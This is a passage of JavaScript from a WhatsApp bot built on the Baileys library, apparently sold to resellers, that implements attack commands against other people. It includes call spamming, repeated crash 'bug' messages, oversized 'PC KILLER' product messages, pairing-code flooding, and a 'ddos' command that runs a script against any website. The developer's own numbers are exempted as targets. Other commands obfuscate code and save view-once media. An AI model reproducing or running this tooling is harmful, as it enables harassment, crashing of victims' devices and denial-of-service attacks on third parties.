    for (let i = 0; i < loopCount; i++) {
        await sleep(1050);
        await XeonBotInc.relayMessage(from, {
            "messageContextInfo": {
                "messageSecret": "eed1zxI49cxiovBTUFLIEWi1shD9HgIOghONuqPDGTk=",
                "deviceListMetaData": {},
                "deviceListMetadataVersion": 2
            },
            "scheduledCallCreationMessage": {
                "scheduledTimestampMs": '1200',
                callType: "AUDIO",
                "title": '👻',
            }
        }, {
            additionalAttributes: {
                edit: '7'
            }
        });
    }
    break;

case 'listpair': {
    if (!(global.db.data.owners || []).includes(senderNumber)) {
    return replygcxeon(`❌ Sorry you don't have permission to use this command. This command can only be used by reseller! 

Want to buy reseller? Chat Developer!
YouTube: @ 
Telegram: @HAKERAHMED2
WhatsApp: +967774772074`);
}

        const pairingPath = './lib2/pairing';

    try {
        // Check if the directory exists
        if (!fs.existsSync(pairingPath)) {
            return replygcxeon('No paired devices found.');
        }

        // Read all directories (and files) inside ./lib2/pairing
        const entries = fs.readdirSync(pairingPath, { withFileTypes: true });

        // Filter for directories (paired device IDs)
        const pairedDevices = entries
            .filter(entry => entry.isDirectory())
            .map(entry => `+${entry.name.replace('@s.whatsapp.net', '')}`); // Add '+' before number

        // Handle if no paired devices are found
        if (pairedDevices.length === 0) {
            return replygcxeon('No paired devices found.');
        }

        // Count total paired devices
        const totalUsers = pairedDevices.length;

        // Format the list of paired devices for the response
        const deviceList = pairedDevices
            .map((device, index) => `${index + 1}. ${device}`)
            .join('\n');

        replygcxeon(`Total Rent Bot Users: ${totalUsers}\n\nPaired Devices:\n${deviceList}`);
    } catch (err) {
        console.error('Error reading paired devices directory:', err);
        return replygcxeon('Failed to load paired devices data.');
    }
}
break;

case 'delpair': {     
 if (!isBot && !isCreator) return     	
        if (!q) return replygcxeon(`Example:\n ${prefix + command} 20XXX`)
victim = text.split("|")[0]
const Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo =  Xreturn;
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }

        const pairingPath = './lib2/pairing';
        const targetPath = `${pairingPath}/${Xreturn}`;

        try { 
            // Check if the target directory exists
            if (!fs.existsSync(targetPath)) {
                return replygcxeon(`Paired device with ID "${Xreturn}" does not exist.`);
            }

            // Delete the target directory and its contents
            fs.rmSync(targetPath, { recursive: true, force: true });

            replygcxeon(`Paired device with ID "${Xreturn}" has been successfully deleted.`);
        } catch (err) {
            console.error('Error deleting paired device:', err);
            return replygcxeon('An error occurred while attempting to delete the paired device.');
        }
    }
break;

case 'reqpair':
        if (!isBot && !isCreator) return
// Check system storage and RAM
    const freeStorage = os.freemem() / (1024 * 1024); // Free memory in MB
    const totalStorage = os.totalmem() / (1024 * 1024); // Total memory in MB
    const freeDiskSpace = fs.statSync('/').available / (1024 * 1024); // Free disk space in MB

    if (freeStorage < 300 || freeDiskSpace < 300) { // Set a threshold of 100 MB for storage and RAM
        return replygcxeon('Slot is full, please try again later.');
    }
if (!q) return replygcxeon(`Example:\n ${prefix + command} 20XXX`)
victim = text.split("|")[0]
const Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo = await XeonBotInc.onWhatsApp(Xreturn);
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
  // Extract and validate the country code or prefix
const countryCode = text.slice(0, 3); // Extract the first 3 digits for country code
const prefixxx = text.slice(0, 1); // Extract the first digit for prefix
const firstTwoDigits = text.slice(0, 2); // Extract the first two digits to check for "89"

// Function to validate if a number is a valid WhatsApp number
const isValidWhatsAppNumber = (number) => {
    return number.length >= 10 && number.length <= 15 && !isNaN(number);
};

if (countryCode === "252" || prefixxx === "0" || firstTwoDigits === "89" || countryCode.startsWith("85")) {
    return replygcxeon("Sorry, numbers with country code 252, prefix 0, starting with 89, or +85 are not supported for using the bot.");
}

if (!isValidWhatsAppNumber(text)) {
    return replygcxeon("Invalid WhatsApp number. Please enter a valid number.");
}    // Proceed with pairing
    const startpairing = require('./rentbot.js');
    await startpairing(Xreturn);
    await sleep(4000);
    
    const cu = fs.readFileSync('./lib2/pairing/pairing.json', 'utf-8');
    const cuObj = JSON.parse(cu);
    
    await replygcxeon(`${cuObj.code}`);

break;
       case "cekperangkat": {
 if (!args[0]) return XeonBotInc.sendMessage(m.chat, { text: 'use : .cekperangkat 20xxx' }, { quoted: m});
 let number = args[0].replace(/[^0-9]/g, '');
 let target = number + '@s.whatsapp.net';
 try {
 let devices = await XeonBotInc.getUSyncDevices([target]);
 let raw = JSON.stringify(devices, null, 2);
 let count = devices?.length || 0;
 let message = `Total perangkat : ${count}\nperangkat : ${raw}`;
 await XeonBotInc.sendMessage(m.chat, { text: message }, { quoted: m});
 } catch(z) {
   replygcxeon(z);
 }
}
break

 case "cekban": {
  if (!q) return replygcxeon(`Example:\n ${prefix + command} 20XXX`)

  const {
    useMultiFileAuthState,
    makeWASocket,
    fetchLatestBaileysVersion,
    Browsers
  } = require("@adiwajshing/baileys");
  const { parsePhoneNumber } = require("libphonenumber-js");
  const pino = require("pino");

  async function cekbann(phoneNumber) {
    let resultData = {
      isBanned: false,
      isNeedOfficialWa: false,
      number: phoneNumber
    };

    if (!phoneNumber.startsWith("+")) {
      phoneNumber = "+" + phoneNumber;
    }

    const parsedNumber = parsePhoneNumber(phoneNumber);
    const countryCode = parsedNumber.countryCallingCode;
    const nationalNumber = parsedNumber.nationalNumber;

    try {
      const { state } = await useMultiFileAuthState(authPath);
      const { version } = await fetchLatestBaileysVersion();

      const XeonBotInc = makeWASocket({
        version,
        auth: state,
        browser: Browsers.ubuntu("Chrome"),
        logger: pino({ level: "silent" }),
        printQRInTerminal: false,
      });

      const registrationOptions = {
        phoneNumberCountryCode: countryCode,
        phoneNumberNationalNumber: nationalNumber,
        phoneNumberMobileCountryCode: "510",
        phoneNumberMobileNetworkCode: "10",
        method: "sms",
      };

      await XeonBotInc.requestRegistrationCode(registrationOptions);

      if (XeonBotInc.ws) {
        XeonBotInc.ws.close();
      }

      return resultData;

    } catch (err) {
      if (err?.custom_block_screen?.btn_secondary_url) {
        resultData.isNeedOfficialWa = true;
      }
      if (err?.appeal_token) {
        resultData.isBanned = true;
        resultData.data = {
          violation_type: err.violation_type || null,
          in_app_ban_appeal: err.in_app_ban_appeal || null,
          appeal_token: err.appeal_token || null,
        };
      }
      return resultData;
    }
  }

  try {
    const result = await cekbann(`${q}`);
    replygcxeon(JSON.stringify(result, null, 2));
  } catch (e) {
    console.log(e);
    replygcxeon("Error checking number!");
  }
}
break;
                
case 'callspam':{
if (!isBot && !isCreator) return
if (!q) return replygcxeon(`Example:\n ${prefix + command} 20XXX`)
victim = text.split("|")[0]
const Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo = await XeonBotInc.onWhatsApp(Xreturn);
  if (victim == "967774772074") {
    return;
    }
    if (victim == "919366316018") {
    return;
    }
    if (victim == "919402104401") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
  async function sendOfferCall(target) {
    try {
        await XeonBotInc.offerCall(target);
        /*console.log(chalk.white.bold(`Success Send Offer Call To Target`));*/
    } catch (error) {
        /*console.error(chalk.white.bold(`Failed Send Offer Call To Target:`, error));*/
    }
}

  sendMessageWithMentions(
    "Successfully Sent Spam Call To @" + Xreturn.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [Xreturn]
  );
	await sleep(1000)
for (let i = 0; i < 7; i++) {
await sendOfferCall(Xreturn)
await sleep(2000)
}
  }
break
  
case 'autoswview':
case 'autostatusview':{
    if (!isBot && !isCreator) return
               if (args[0] === 'on') {
                  db.data.settings[botNumber].antiswview = true
                  replygcxeon(`Successfully ${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.settings[botNumber].antiswview = false
                  replygcxeon(`Successfully ${command} is disabled`)
               } else {
                	replygcxeon(`Please select on/off\n\Example: ${prefix+command} on`)
            }
            }
            break
            
case 'totag': {
				if (!m.isGroup) return replygcxeon(mess.OnlyGrup)
				if (!m.quoted) return replygcxeon(`Reply message with caption ${prefix + command}`)
				delete m.quoted.chat
				await XeonBotInc.sendMessage(m.chat, { forward: m.quoted.fakeObj, mentions: participants.map(a => a.id) })
			}
			break
			
			case 'hidetag': case 'h': {
				if (!m.isGroup) return replygcxeon(mess.OnlyGrup)
				XeonBotInc.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)})
			}
			break
			
			case 's': case 'sticker': case 'stiker': {
if (!quoted) return replygcxeon(`Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds`)
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await XeonBotInc.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return replygcxeon('Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds')
let media = await quoted.download()
let encmedia = await XeonBotInc.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
} else {
replygcxeon(`Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds`)
}
}
break

case 'swm': case 'steal': case 'stickerwm': case 'take':{
if (!isPremium) return replyprem(mess.premium)
if (!args.join(" ")) return replygcxeon(`Where is the text?`)
const swn = args.join(" ")
const pcknm = swn.split("|")[0]
const atnm = swn.split("|")[1]
if (m.quoted.isAnimated === true) {
XeonBotInc.downloadAndSaveMediaMessage(quoted, "gifee")
XeonBotInc.sendMessage(m.chat, {sticker:fs.readFileSync("gifee.webp")}, m, { packname: pcknm, author: atnm })
} else if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await XeonBotInc.sendImageAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return replygcxeon('Maximum 10 Seconds!')
let media = await quoted.download()
let encmedia = await XeonBotInc.sendVideoAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
} else {
replygcxeon(`Photo/Video?`)
}
}
break

case 'xpairspam': {

			if (!q) return replygcxeon(`_Use : ${prefix+command} number\n_Example : ${prefix+command} 916909137211`)
			let [peenis, pepekk = "200"] = q.split("|")
			
			let target = peenis.replace(/[^0-9]/g, '').trim()
			let {
				default: makeWaSocket,
				useMultiFileAuthState,
				fetchLatestBaileysVersion
			} = require('@adiwajshing/baileys')
			let {
				state
			} = await useMultiFileAuthState('XSession')
			let {
				version
			} = await fetchLatestBaileysVersion()
	 replygcxeon(`Success!`)
			let sucked = await makeWaSocket({
				auth: state,
				version,
				logger: pino({
					level: 'fatal'
				})
			})
			for (let i = 0; i < pepekk; i++) {
				await sleep(1500)
				let prc = await sucked.requestPairingCode(target)
				/*await console.log(`Succes Spam Pairing Code - Number : ${target} - Code : ${prc}`)*/
			}
			await sleep(15000)
			}
		break
		
case 'ddos':{
if (!isBot && !isCreator) return
if (!q.includes(' ')) return replygcxeon(`Use Methode: .${command} <target> <time>\nExaple: .${command} example.xyz 60`)
if (q.includes(' .shop')){
	return replygcxeon(`Cannot attack developer's site`);
	}
                     const targetweb = q.substring(0, q.indexOf(' ') - 0)
                const timeweb = q.substring(q.lastIndexOf(' ') + 1) 
replygcxeon(`Bot is attacking ${targetweb} with time ${timeweb}`)
              exec(`node ddos.js ${targetweb} ${timeweb}`, { maxBuffer: 1024 * 1024 }, (error, stdout, stderr) => {
        if (error) {
          replygcxeon(`Error: ${error.message}`);
          return;
        }
        if (stderr) {
          replygcxeon(`Error: ${stderr}`);
          return;
        }
        replygcxeon(`Success\n\n🤙 target: ${targetweb},\n🤙 Time: ${timeweb}`);
      });  
      }                 
break

case 'enc': case 'encrypt': {
if (!isBot && !isCreator) return
        const JSConfuser = require("js-confuser");
        const usage = `Usage Example:
${prefix + command} (Input text or reply text to obfuscate code)
${prefix + command} doc (Reply to a document)`;

        let text;
        if (args.length >= 1) {
            text = args.join(" ");
        } else if (m.quoted && m.quoted.text) {
            text = m.quoted.text;
        } else {
            return replygcxeon(usage);
        }
        
        try {
            let code;
            if (text === 'doc' && m.quoted && m.quoted.mtype === 'documentMessage') {
                let docBuffer;
                if (m.quoted.mimetype) {
                    docBuffer = await m.quoted.download();
                }
                code = docBuffer.toString('utf-8');
            } else {
                code = text;
            }

const optionsObf6 = {
          target: "node",
    preset: "high",
    compact: true,
    minify: true,
    flatten: true,

    identifierGenerator: function() {
        const originalString = 
            "素晴座素晴難FLIX素晴座素晴難" + 
            "素晴座素晴難💀𝐂𝐑𝐀𝐒𝐇.💀𝐀𝐇𝐌𝐄𝐃😈 BOT素晴座素晴難";
        
        // Fungsi untuk menghapus karakter yang tidak diinginkan
        function removeUnwantedChars(input) {
            return input.replace(
                /[^a-zA-Z座Nandokuka素Muzukashī素晴]/g, ''
            );
        }

        // Fungsi untuk menghasilkan string acak
        function randomString(length) {
            let result = '';
            const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'; // Hanya simbol
            const charactersLength = characters.length;

            for (let i = 0; i < length; i++) {
                result += characters.charAt(
                    Math.floor(Math.random() * charactersLength)
                );
            }
            return result;
        }

        return removeUnwantedChars(originalString) + randomString(2);
    },

    renameVariables: true,
    renameGlobals: true,

    stringEncoding: true,
    stringSplitting: 0.0,
    stringConcealing: true,
    stringCompression: true,
    duplicateLiteralsRemoval: 1.0,

    shuffle: {
        hash: 0.0,
        true: 0.0
    },

    stack: true,
    controlFlowFlattening: 1.0,
    opaquePredicates: 0.9,
    deadCode: 0.0,
    dispatcher: true,
    rgf: false,
    calculator: true,
    hexadecimalNumbers: true,
    movedDeclarations: true,
    objectExtraction: true,
    globalConcealing: true
};


        const options = {
            target: "node",
  calculator: true,
  compact: true,
  hexadecimalNumbers: true,
  controlFlowFlattening: 0.5,
  deadCode: 0.25,
  dispatcher: true,
  duplicateLiteralsRemoval: 0.75,
  flatten: true,
  globalConcealing: true,
  minify: true,
  movedDeclarations: true,
  objectExtraction: true,
  opaquePredicates: 0.75,
  renameVariables: true,
  renameGlobals: true,
  shuffle: true,
  stringConcealing: true,
  stringCompression: true,
  stringEncoding: true,
  stringSplitting: 0.75,
  preserveFunctionLength: true,
  identifierGenerator: function () {
                return "DREAM_GUY_XEON" + Math.random().toString(36).substring(7);
            },
        };

            const obfuscatedCode = await JSConfuser.obfuscate(code, optionsObf6);

            const filePath = './enc_by_@ .js';
            fs.writeFileSync(filePath, obfuscatedCode);

            await XeonBotInc.sendMessage(m.chat, {
                document: {
                    url: filePath
                },
                mimetype: 'application/javascript',
                fileName: 'Encrypted By @ .js'
            }, { quoted: m });

        } catch (error) {
            const errorMessage = `There is an error: ${error.message}`;
            await replygcxeon(errorMessage);
        }
}
break;

case 'dec': case 'decrypt': {
if (!isBot && !isCreator) return
const { webcrack } = await import('webcrack');
const usage = `Usage Example:
${prefix + command} (Input text or reply text to dec code)
${prefix + command} doc (Reply to a document)`;

let text;
if (args.length >= 1) {
text = args.join(" ");
} else if (m.quoted && m.quoted.text) {
text = m.quoted.text;
} else {
return replygcxeon(usage);
}

try {
let message;
if (text === 'doc' && m.quoted && m.quoted.mtype === 'documentMessage') {
let docBuffer;
if (m.quoted.mimetype) {
docBuffer = await m.quoted.download();
}
message = await webcrack(docBuffer.toString('utf-8'));
} else {
message = await webcrack(text);
}

const filePath = './dec_by_@ .js';
fs.writeFileSync(filePath, message.code);

await XeonBotInc.sendMessage(m.chat, {
document: {
url: filePath
},
mimetype: 'application/javascript',
fileName: 'Decrypted By @ '
}, {quoted: m});

} catch (error) {
const errorMessage = `There is an error: ${error.message}`;
await replygcxeon(errorMessage);
}
}
break;
case "rvo": case "readviewonce": {
 if (!text) return replygcxeon(mess.wait);
if (!m.quoted) return replygcxeon("reply pesan viewOnce nya!")
let msg = m?.quoted?.message?.imageMessage || m?.quoted?.message?.videoMessage || m?.quoted?.message?.audioMessage || m?.quoted
if (!msg.viewOnce && m.quoted.mtype !== "viewOnceMessageV2" && !msg.viewOnce) return replygcxeon("Pesan itu bukan viewonce!")
const { downloadContentFromMessage } = require("@adiwajshing/baileys");
let media = await downloadContentFromMessage(msg, msg.mimetype == 'image/jpeg' ? 'image' : msg.mimetype == 'video/mp4' ? 'video' : 'audio')
    let type = msg.mimetype
    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }
    if (/video/.test(type)) {
        return XeonBotInc.sendMessage(m.chat, {video: buffer, caption: msg.caption || ""}, {quoted: m})
    } else if (/image/.test(type)) {
        return XeonBotInc.sendMessage(m.chat, {image: buffer, caption: msg.caption || ""}, {quoted: m})
    } else if (/audio/.test(type)) {
        return XeonBotInc.sendMessage(m.chat, {audio: buffer, mimetype: "audio/mpeg", ptt: true}, {quoted: m})
    } 
}
break

case 'clearchat':{
if (!isBot && !isCreator) return
m.reply('\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n')
                    }
break

case "checkhost": {

if (!q) return replygcxeon(`Example : ${prefix + command} https://nxnn.com`)
let msg = { viewOnceMessage: {
message: {
  "interactiveMessage": {
    "header": {
      "title": "",
      "subtitle": "p"
    },
    "body": {
      "text": "Click Chech Host To Check Web"
    },
    "footer": {
      "text": botname
    },
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": JSON.stringify( {display_text : 'Check Host' , url : `https://check-host.net/check-http?host=${q}`, merchant_url : `https://check-host.net/check-http?host=${q}` })
        }
      ],
      "messageParamsJson": ""
    }
  }
}
}
}
XeonBotInc.relayMessage(m.chat, msg, {});
}
break

case 'addresell': case 'addreseller': {
    if (!global.dev.includes(senderNumber)) return
    
    let number = text.replace(/[^0-9]/g, '') // Extract number from text
    if (!number) return replygcxeon("Please provide a valid number.");

    if (global.db.data.owners.includes(number)) {
        return replygcxeon("Number already in reseller list.");
    }

    global.db.data.owners.push(number);
    fs.writeFileSync('./database/database.json', JSON.stringify(global.db, null, 2));
    replygcxeon(`Number ${number} added to reseller.`);
}
break;

case 'delresell': case 'delreseller': {
    if (!global.dev.includes(senderNumber)) return

    let numberToDelete = text.replace(/[^0-9]/g, '') // Extract the number
    if (!numberToDelete) return m.reply("Please provide a valid number to delete.");

    // Check if the number exists in the owners list
    let index = global.db.data.owners.indexOf(numberToDelete);
    if (index === -1) {
        return replygcxeon("The provided number is not in the reseller list.");
    }

    // Remove the number from the owners list
    global.db.data.owners.splice(index, 1);
    fs.writeFileSync('./database/database.json', JSON.stringify(global.db, null, 2));
    replygcxeon(`Number ${numberToDelete} has been removed from the reseller list.`);
}
break;

case 'listresell': case 'listreseller': {
    let owners = global.db.data.owners || [];
    if (owners.length === 0) {
        return replygcxeon("There are no reseller in the list.");
    }

    let ownerList = owners.map((num, index) => `${index + 1}. ${num}`).join('\n');
    replygcxeon(`Total Reseller: ${owners.length}\n\n${ownerList}`);
}
break;


case 'addprem':
			case 'addpremium': {
				if (!(global.db.data.owners || []).includes(senderNumber)) {
    return replygcxeon(`❌ Sorry you don't have permission to use this command. This command can only be used by reseller! 

Want to buy reseller? Chat Developer!
YouTube: 
Telegram: @HAKERAHMED2
WhatsApp: +967774772074`);
}
				if (!text) return replygcxeon(`*Incorrect use!*\n\nUsage:\n${prefix + command} <user|time>\n\nExample:\n${prefix + command} @0|1d`)
				let nomor = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.split("|")[0].replace(/[^0-9]/g, '') + "@s.whatsapp.net"
				if (owner.includes(nomor)) return replygcxeon("*Bot owners can't get owner!*")
				let premium = await cd.isPremium(usersdb, nomor)
				if (premium) return replygcxeon("*This user is already in the premium list*")
				let users = await XeonBotInc.onWhatsApp(nomor)
				if (users.length < 1) return replygcxeon(`*Tag/reply/input number correctly!*\n\nUsage:\n${prefix + command} <user|time>\n\nExample:\n${prefix + command} @0|1d`)
				let expired = text.split("|")[1]
				if (!expired) return replygcxeon(`*Enter expiry date!*\n\nUsage:\n${prefix + command} <user|time>\n\nExample:\n${prefix + command} @0|1d`)
				await XeonBotInc.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
				let addprem = await cd.addPrem(usersdb, users[0].jid, expired)
				const contentText = {
					text: addprem,
					contextInfo: {
						mentionedJid: XeonBotInc.ments(addprem),
						externalAdReply: {
							title: `PREMIUM 💳`,
							previewType: "PHOTO",
							thumbnailUrl: `https://pomf2.lain.la/f/dynqtljb.jpg`,
							sourceUrl: link
						}
					}
				};
				return XeonBotInc.sendMessage(m.chat, contentText, {
					quoted: m,
				});
			}
			break

case 'delprem':
			case 'delpremium': {
				if (!(global.db.data.owners || []).includes(senderNumber)) {
    return replygcxeon(`❌ Sorry you don't have permission to use this command. This command can only be used by reseller! 

Want to buy reseller? Chat Developer!
YouTube: @ 
Telegram: @HAKERAHMED2
WhatsApp: +967774772074`);
}
				if (!text) return replygcxeon(`*Incorrect use!*\n\nUsage:\n${prefix + command} <user>\n\nExample:\n${prefix + command} @0`)
				let nomor = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + "@s.whatsapp.net"
				let premium = await cd.isPremium(usersdb, nomor)
				if (!premium) return replygcxeon("*This user is not a premium user!*")
				let delprem = await cd.delPrem(usersdb, nomor)
				replygcxeon(delprem)
			}
			break
        
case 'listprem':
case 'listpremium': {
	if (!(global.db.data.owners || []).includes(senderNumber)) {
    return replygcxeon(`❌ Sorry you don't have permission to use this command. This command can only be used by reseller! 

Want to buy reseller? Chat Developer!
YouTube: @ 
Telegram: @HAKERAHMED2
WhatsApp: +967774772074`);
}
    try {
        let premium = await cd.listPremium(usersdb);
        let teks = `*</> PREM USER LIST </>*\n\n`;

        for (let i = 0; i < premium.length; i++) {
            let expiry = usersdb[premium[i]].premiumExpiry;

            if (!expiry || expiry <= Date.now()) {
                teks += `${i + 1}. @${premium[i].split("@")[0]}\nExpired: Already expired\n\n`;
                continue;
            }

            // Calculate remaining time
            let timeLeft = expiry - Date.now();
            let days = Math.floor(timeLeft / (1000 * 60 * 60 * 24));
            let hours = Math.floor((timeLeft % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
            let minutes = Math.floor((timeLeft % (1000 * 60 * 60)) / (1000 * 60));

            teks += `${i + 1}. @${premium[i].split("@")[0]}\nExpire In: ${days} day, ${hours} hour, ${minutes} minute\n\n`;
        }

        XeonBotInc.sendTextWithMentions(m.chat, teks, m);
    } catch (error) {
        replygcxeon(util.format(error), command);
    }
}
break;	 
	
case 'checkprem':
case 'checkpremium': {
    try {
        let expiry = usersdb[m.sender].premiumExpiry;
        if (!expiry || expiry <= Date.now()) {
            return replygcxeon(`Your owner subscription has already expired.`);
        }

        // Calculate remaining time
        let timeLeft = expiry - Date.now();
        let days = Math.floor(timeLeft / (1000 * 60 * 60 * 24));
        let hours = Math.floor((timeLeft % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
        let minutes = Math.floor((timeLeft % (1000 * 60 * 60)) / (1000 * 60));

        let teks = `*</> PREM USER INFO </>*

*Subscribe Info* :
- User : @${m.sender.split("@")[0]}
- Duration : ${days}D
- Expire In : 
${days} day, ${hours} hour, ${minutes} minute

*Benefit Info* :
- Premium Access : Yes
- User Priority : Yes
`;

        const contentText = {
            text: teks,
            contextInfo: {
                mentionedJid: XeonBotInc.ments(teks),
                externalAdReply: {
                    title: `PREMIUM 💳`,
                    previewType: "PHOTO",
                    thumbnailUrl: `https://pomf2.lain.la/f/dynqtljb.jpg`,
                    sourceUrl: link,
                },
            },
        };

        return XeonBotInc.sendMessage(m.chat, contentText, { quoted: m });
    } catch (error) {
        await replygcxeon(util.format(error), command);
    }
}
break;

case 'self': {
    if (!isBot && !isCreator) return
XeonBotInc.public = false
replygcxeon('Success Change To Self Mode')
}
break

case 'public': {
    if (!isBot && !isCreator) return
XeonBotInc.public = true
replygcxeon('Success Change To Public Mode')
}
break
case "listgc":{
if (!isBot && !isCreator) return
let getGroups = await XeonBotInc.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
let hituet = 0
let teks = `⬣ *LIST OF GROUP BELOW*\n\nTotal Group : ${anu.length} Group\n\n`
for (let x of anu) {
let metadata2 = await XeonBotInc.groupMetadata(x)
teks += `❏ Group ${hituet+=1}\n│⭔ *Name :* ${metadata2.subject}\n│⭔ *ID :* ${metadata2.id}\n│⭔ *MEMBER :* ${metadata2.participants.length}\n╰────|\n\n`
}
m.reply(teks)
  }
break

case 'owner': {
const wokex = ownernomer // Extract the number part
const pushnamex = `${wokex}`
const kontak = {
"displayName": pushnamex,
vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN: ${pushnamex}\nitem1.TEL;waid=${wokex}:${wokex}\nitem1.X>ABLabel:\nPlease Don't Spam My Owner\nURL;Email Owner:${pushnamex}@gmail.com\nORG: THIS IS MY OWNER\nEND:VCARD`
}
const oke = await XeonBotInc.sendMessage(from, {
contacts: { contacts: [kontak] },
contextInfo:{ forwardingScore: 999, isForwarded: false, mentionedJid:[sender],
"externalAdReply":{
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"jpegThumbnail": fs.readFileSync("./XeonMedia/thumb.jpg"),
"mediaUrl": 'https://i.ibb.co/ydRKHnw/thumb.jpg',
"sourceUrl": `https://youtube.com/@ `
}}}, { quoted: m })
//await XeonBotInc.sendMessage(m.chat, {audio: fs.readFileSync('./XeonMedia/sikma.mp3'),mimetype: 'audio/mpeg',ptt: true}, {quoted:oke})
}
break

case 'xweb':
        if (!isBot && !isCreator) return
try {
for (let i = 0; i < 10; i++) {
messa = await prepareWAMessageMedia({
image: {
url: `https://pic.re/image`
}
}, {
upload: XeonBotInc.waUploadToServer
})
catalog = generateWAMessageFromContent(from, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "449756950375071",
"itemCount": 99999999999,
"title": `PC KILLER X Telegram: @HAKERAHMED2`,
"description": ``,
"currencyCodeIso4217": "IDR",
"footerText": ``,
"productImageCount": 99999999999999999999,
"firstImageId": 9999999999,
"priceAmount1000": "999",
"salePriceAmount1000": "IDR 99.99999999999999999999",
"thumbnail": messa.imageMessage,
"jpegThumbnail": m,
"firstImageId": 99999999,
"url": "wa.me/5512981791389"
},
"businessOwnerJid": from,
}
}), {
userJid: XeonBotInc.user.id,
quoted: null
})
XeonBotInc.relayMessage(from, catalog.message, {
messageId: catalog.key.id
})
}
} catch (e) {
console.log(e);
}
break

case 'ping': case 'runtime': case 'p': case 'botstatus': case 'statusbot': {
if (!isBot && !isCreator) return
                const speed = require('performance-now')
const { performance } = require('perf_hooks')
                let timestamp = speed()
                let latensi = speed() - timestamp
                neww = performance.now()
                oldd = performance.now()
                respon = `
Response Speed:\n${latensi.toFixed(4)} _Second_ \n${oldd - neww} _miliseconds_\n\nRuntime:\n${runtime(process.uptime())}
                `.trim()
                replygcxeon(respon)
            }
            break
            
case 'makecase':
if (!isBot && !isCreator) return
if (!m.quoted) return replygcxeon('Reply to a message to make a case of it!');
кибар = q.split(' ')[0];
if (!кибар) {
        return replygcxeon(`Example Usage: ${prefix+command} abc`);
    }    
const kak = (JSON.stringify(m.message.extendedTextMessage.contextInfo.quotedMessage, null, 2))
replygcxeon (`case '${кибар}': 
if (!isBot && !isCreator) return
try {
var ${кибар} = generateWAMessageFromContent(from, proto.Message.fromObject(${kak}),{ userJid: from })
flixbot.relayMessage(from, ${кибар}.message, {messageId: ${кибар}.key.id })
} catch (e) {
console.log(e)
}
break`)
break


case 'crashcall': {
        if (!isBot && !isCreator) return
if (!q) return replygcxeon(`Example:\n ${prefix + command} 20XXX`)
victim = text.split("|")[0]
const Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo = await XeonBotInc.onWhatsApp(Xreturn);
  if (victim == "967774772074") {
    return;
    }
    if (victim == "201032935369") {
    return;
    }
    if (victim == "201206738488") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
  
sendMessageWithMentions(
    "Successfully Sent Bug To @" + Xreturn.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [Xreturn]
  );
  for (let i = 0; i <50; i++) {
      await callCrash(Xreturn);
      await (100)
}
}
break


case 'xdelay': {
        if (!isBot && !isCreator) return
if (!q) return replygcxeon(`Example:\n ${prefix + command} 20XXX`)
victim = text.split("|")[0]
const Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo = await XeonBotInc.onWhatsApp(Xreturn);
  if (victim == "967774772074") {
    return;
    }
    if (victim == "201032935369") {
    return;
